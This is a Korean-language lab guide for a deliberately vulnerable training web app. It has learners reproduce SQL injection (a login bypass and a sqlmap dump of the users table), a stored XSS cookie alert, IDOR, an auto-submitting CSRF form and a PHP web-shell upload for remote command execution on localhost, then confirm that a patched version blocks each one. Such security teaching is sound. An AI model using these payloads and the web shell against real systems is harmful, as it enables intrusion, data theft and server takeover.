# 공격 재현 실습 가이드

> `docker compose up --build` 후, 취약 버전(<http://localhost:8001>)에서 공격을 재현하고,
> 보완 버전(<http://localhost:8080>)에서 같은 공격이 막히는지 확인하는 순서입니다.
> 각 단계의 상세 설명은 루트 `README.md` 2장을 참고하세요.

## 준비
- 테스트 계정: `admin/Admin!234`, `yuna/yuna1234`, `minho/minho1234`, `gaeun/gaeun1234`
- 반드시 **격리된 로컬(VM) 환경에서 가상 데이터로만** 수행하세요. 파일 업로드 실습은 무해한 테스트 파일만.

> **판정 기준·용어(정확도)**
> - XSS: 이 랩은 **저장형(Stored)** 중심. "스크립트 실행 차단(이스케이프)"과 "쿠키 접근 차단(HttpOnly)"은 **별개**로 확인.
> - 비밀번호: **해시(단방향)**. "암호화"라 쓰지 말 것.
> - 파일 업로드: **"업로드 거부"**(비이미지 거부)와 **"실행 차단"**(저장돼도 .php 실행 403)을 **구분**해 각각 확인.
> - IDOR: **403 여부가 아니라 타인 데이터가 실제로 노출/변경되는지**로 판정. 보완 회원정보 수정은 URL id를 무시하고
>   본인 id만 쓰므로 403이 아닐 수 있음(정상). **공개 게시글 조회는 정상 기능(IDOR 아님)**.
> - CSRF와 IDOR는 **각각 독립 시나리오로** 검증(섞지 말 것). SameSite=Lax라 교차 사이트 POST 조건에 유의.

---

## 1. SQL Injection — 로그인 우회
1. 8001 로그인 화면 → 아이디 `admin' -- ` (뒤에 공백 한 칸), 비밀번호는 아무 값.
2. 비밀번호 없이 admin 으로 로그인되면 성공.
3. 8080 에서 동일 입력 → 로그인 실패(차단) 확인.

## 2. SQL Injection — 회원정보 탈취
목록 쿼리는 여러 줄이고 끝에 `ORDER BY posts.id DESC` 가 붙으며, 기본 검색(`search_type=all`)은
검색 조건을 괄호로 묶습니다. 그래서 한 줄짜리 UNION 페이로드는 문법 오류가 납니다 —
**그 오류 화면 자체가 "주입이 통한다"는 증거**입니다(실제 SQL 과 서버 경로가 노출됨, error-based).

### 2-A. sqlmap 으로 users 테이블 덤프 (권장 · 가장 깔끔한 증거)
- 취약(성공):
  ```
  sqlmap -u "http://localhost:8001/board/list.php?search_type=title&keyword=zzz" -p keyword --batch --dump -D mitjul_vuln -T users
  ```
  → `username` 과 **평문** `password` 가 표로 출력됨. (취약점 5: 평문 저장과 연결)
- 보완(차단):
  ```
  sqlmap -u "http://localhost:8080/board/list.php?search_type=title&keyword=zzz" -p keyword --batch
  ```
  → `parameter 'keyword' does not seem to be injectable` (Prepared Statement 방어).

### 2-B. 브라우저 오류 기반 증거 (선택)
- 취약: 검색창에 `zzz' UNION SELECT 1 -- ` 처럼 열 수가 안 맞는 입력을 넣으면
  `The used SELECT statements have a different number of columns` 또는 문법 오류가 화면에 노출됨
  → DB 오류·쿼리·서버 경로가 그대로 보이는 화면을 캡처(= error-based SQLi 증거).
- 보완: 같은 입력 → 오류 없이 "결과 없음"(일반 화면).

## 3. 저장형 XSS
1. 8001 `문장 남기기` → "밑줄 친 문장" 칸에:
   ```html
   <script>alert(document.cookie)</script>
   ```
2. 저장 후 그 문장을 열면 스크립트 실행(알림창).
3. 8080 에서 같은 글 → `<script>` 가 글자 그대로 보이고 실행 안 됨.

## 4. 권한 우회 / IDOR
1. 8001 에서 `yuna` 로 로그인.
2. 주소창에 `http://localhost:8001/account/edit.php?id=1` → 관리자(admin) 수정 폼이 열림.
3. 또는 다른 사람 문장의 `board/edit.php?id=…` 직접 접근 → 수정 가능.
4. 8080 에서 동일 시도 → `403 수정/삭제 권한이 없습니다.`

## 5. CSRF
1. 아래 HTML 파일을 로컬에 만들어 브라우저로 염(8001 로그인 상태에서):
   ```html
   <form action="http://localhost:8001/board/delete.php" method="post">
     <input type="hidden" name="id" value="1">
   </form>
   <script>document.forms[0].submit();</script>
   ```
2. 클릭 없이도 1번 문장이 삭제됨.
3. 8080 대상 동일 파일 → `403 잘못된 요청입니다.` (토큰 없음).

## 6. 파일 업로드 → RCE
1. 웹쉘 `shell.php` 생성:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. 8001 `문장 남기기` → 필사 이미지 자리에 `shell.php` 첨부 후 저장.
3. 저장된 글 번호가 N이면 `http://localhost:8001/uploads/N_shell.php?cmd=id` 접속 → 명령 실행 결과 확인.
4. 8080 에서 `shell.php` 업로드 시 "이미지 파일만" 거부. 설령 저장돼도 `.htaccess` 로 실행 403.

---

### 정리
취약 버전에서 통하던 6가지 공격이 보완 버전에서 전부 막히는 것을 확인하면 실습 완료입니다.
각 방어가 코드의 어느 줄에서 이뤄지는지는 `README.md` 2장의 "④ 보완 코드"를 참고하세요.
